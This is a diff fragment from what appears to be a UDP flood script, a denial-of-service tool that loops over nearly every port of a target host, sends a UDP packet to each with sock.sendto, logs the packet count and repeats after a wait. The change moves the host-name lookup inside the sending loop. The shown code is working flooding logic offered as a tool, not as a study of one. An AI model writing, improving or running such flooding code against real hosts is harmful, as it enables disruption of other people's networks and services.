@@ -86,18 +86,16 @@ dtime = now.strftime("%Y-%m-%d %H:%M:%S")
 if port_mode == False:  # All ports.
     try:
         while True:
-            if port == 65534:
-                
+            if port == 65534:                
                 print('\033[32;1m[%s]Sented %s packets to %s through port:1~%s\033[0m'%(dtime, sent, ip, port))
                 print('\033[1;36m/wait %s'%(timeR))
                 port = 1
-                time.sleep(timeR)
-                ip = socket.gethostbyname(url)
-                
+                time.sleep(timeR)                               
 
             elif port == 1900:
                 port = 1901
 
+            ip = socket.gethostbyname(url)
             sock.sendto(bytes, (str(ip), port))
             sent += 1
             port += 1
